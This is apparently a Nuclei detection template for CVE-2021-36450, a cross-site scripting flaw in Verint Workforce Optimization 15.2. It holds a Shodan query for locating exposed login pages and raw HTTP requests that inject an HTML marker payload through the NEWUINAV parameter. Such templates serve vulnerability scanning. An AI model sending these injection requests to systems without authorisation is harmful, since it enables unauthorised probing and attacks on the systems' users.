id: CVE-2021-36450
info:
  author: atomiczsec
  classification:
    cve-id: CVE-2021-36450
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: Verint Workforce Optimization (WFO) 15.2.8.10048 allows XSS via the
    control/my_notifications NEWUINAV parameter.
  metadata:
    shodan-query: title:"Verint Sign-in"
    verified: 'true'
  name: Verint 15.2 - Cross Site Scripting
  reference:
  - https://medium.com/@1nf0sk/cve-2021-36450-cross-site-scripting-xss-6f5d8d7db740
  - https://sushantvkamble.blogspot.com/2021/11/cross-site-scripting-xss.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-36450
  - http://verint.com
  severity: medium
  tags: cve,cve2021,xss,verint
requests:
- cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: csrfp_login
    part: header
    regex:
    - csrfp_login=([a-zA-Z0-9]+);
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - '"><h1>Test</h1>26" class="loginUserNameText'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'GET /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3C%2Fh1%3E26
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wfo/control/signin?rd=%2Fwfo%2Fcontrol%2Fmy_notifications%3FNEWUINAV%3D%22%3E%3Ch1%3ETest%3Ch1%3E%26
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    browserCheckEnabled=true&username=admin&language=en_US&defaultHttpPort=80&screenHeight=1080&screenWidth=1920&pageModelType=0&pageDirty=false&pageAction=Login&csrfp_login={{csrfp_login}}

    '
  redirects: true
